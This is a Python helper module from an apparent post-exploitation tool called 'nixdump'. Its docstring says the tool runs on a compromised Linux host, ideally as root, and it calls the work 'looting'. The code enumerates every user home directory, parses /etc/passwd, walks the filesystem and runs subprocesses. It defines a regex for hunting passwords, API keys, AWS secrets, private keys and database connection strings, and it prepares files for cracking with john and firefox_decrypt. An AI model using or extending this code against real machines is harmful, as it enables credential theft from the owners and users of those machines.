"""Subprocess + filesystem helpers for local looting.

Design: nixdump runs ON a compromised Linux host (ideally as root) and reads the
filesystem directly. Every read is wrapped so a missing/unreadable file never
crashes a collector - a looter must keep going and grab what it can.
"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
from dataclasses import dataclass
from typing import Iterable, List, Optional, Tuple

_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")

# When looting offline from a collected bundle, every absolute target path is
# read from under this root instead of the live filesystem. Live mode = "".
ROOT = ""


def set_root(path: str) -> None:
    global ROOT
    ROOT = path.rstrip("/") if path else ""


def _real(p: str) -> str:
    """Logical (target-absolute) path -> real path on this disk."""
    if ROOT and p.startswith("/"):
        return ROOT + p
    return p


def _logical(p: str) -> str:
    """Real path on disk -> logical (target-absolute) path for display/re-read."""
    if ROOT and p.startswith(ROOT):
        return p[len(ROOT):] or "/"
    return p


def strip_ansi(s: str) -> str:
    return _ANSI_RE.sub("", s).replace("\x00", "")


def is_root() -> bool:
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


def which(name: str) -> Optional[str]:
    return shutil.which(name)


def read_text(path: str, max_bytes: int = 512 * 1024) -> Optional[str]:
    """Read a file as text, capped. Returns None if unreadable."""
    try:
        with open(_real(path), "rb") as fh:
            data = fh.read(max_bytes + 1)
        return data.decode("utf-8", errors="ignore")
    except OSError:
        return None


def read_bytes(path: str, max_bytes: int = 4 * 1024 * 1024) -> Optional[bytes]:
    try:
        with open(_real(path), "rb") as fh:
            return fh.read(max_bytes)
    except OSError:
        return None


def realpath(path: str) -> str:
    """Public: map a logical target path to the real on-disk path. Use when
    handing a collected file to an external tool (john, ssh2john, firefox_decrypt)."""
    return _real(path)


def exists(path: str) -> bool:
    return os.path.exists(_real(path))


def isdir(path: str) -> bool:
    return os.path.isdir(_real(path))


def home_dirs() -> List[str]:
    """Every real user home + /root (what we can see). Root sees all; a normal
    user usually only their own, but we try all and let reads fail gracefully."""
    homes = set()
    if os.path.isdir(_real("/root")):
        homes.add("/root")
    for base in ("/home",):
        try:
            for name in os.listdir(_real(base)):
                p = os.path.join(base, name)
                if os.path.isdir(_real(p)):
                    homes.add(p)
        except OSError:
            pass
    # also parse /etc/passwd for non-standard home dirs
    pw = read_text("/etc/passwd")
    if pw:
        for line in pw.splitlines():
            parts = line.split(":")
            if len(parts) >= 6 and parts[5].startswith("/") and os.path.isdir(_real(parts[5])):
                homes.add(parts[5])
    return sorted(homes)


def user_of_home(path: str) -> str:
    """Best-effort: username from a home path (/home/mark -> mark, /root -> root)."""
    p = path.rstrip("/")
    if p == "/root":
        return "root"
    return os.path.basename(p)


def find_files(roots: Iterable[str], name_regex: re.Pattern, max_depth: int = 6,
               max_hits: int = 5000, follow_symlinks: bool = False) -> List[str]:
    """Walk roots, return files whose BASENAME matches name_regex. Depth-limited
    and capped so it can't run away on a huge filesystem."""
    hits: List[str] = []
    for root in roots:
        rroot = _real(root)
        if not os.path.isdir(rroot):
            continue
        base_depth = rroot.rstrip("/").count("/")
        for dirpath, dirnames, filenames in os.walk(rroot, followlinks=follow_symlinks):
            depth = dirpath.rstrip("/").count("/") - base_depth
            if depth >= max_depth:
                dirnames[:] = []
            # skip noisy pseudo/irrelevant trees
            dirnames[:] = [d for d in dirnames if d not in
                           ("proc", "sys", "dev", "snap", "node_modules",
                            ".cache", "__pycache__")]
            for fn in filenames:
                if name_regex.search(fn):
                    hits.append(_logical(os.path.join(dirpath, fn)))
                    if len(hits) >= max_hits:
                        return hits
    return hits


@dataclass
class CmdResult:
    cmd: List[str]
    rc: int
    stdout: str
    stderr: str
    timed_out: bool = False

    @property
    def output(self) -> str:
        return self.stdout + ("\n" + self.stderr if self.stderr else "")


def run(cmd: List[str], timeout: int = 300, input_text: Optional[str] = None) -> CmdResult:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                              input=input_text, errors="ignore")
        return CmdResult(cmd, proc.returncode, proc.stdout or "", proc.stderr or "")
    except subprocess.TimeoutExpired as e:
        return CmdResult(cmd, -1,
                         e.stdout if isinstance(e.stdout, str) else "",
                         e.stderr if isinstance(e.stderr, str) else "",
                         timed_out=True)
    except FileNotFoundError:
        return CmdResult(cmd, 127, "", "binary not found")


# keyword regex shared by several collectors for grepping config/history files
CRED_KW = re.compile(
    r"(pass(word|wd|phrase)?|pwd|secret|api[_-]?key|token|bearer|"
    r"connection[_-]?string|conn[_-]?str|data source|initial catalog|"
    r"aws_secret|aws_access|client_secret|private[_-]?key|credential|"
    r"db_pass|db_user|smtp_pass|redis.*auth|mongodb(\+srv)?://|mysql://|"
    r"postgres(ql)?://|amqp://|ftp://[^\s]*:[^\s]*@|://[^\s/]*:[^\s/@]+@|"
    r"BEGIN [A-Z ]*PRIVATE KEY|-----BEGIN|define\(['\"]DB_|pwd=|passwd=)",
    re.I)
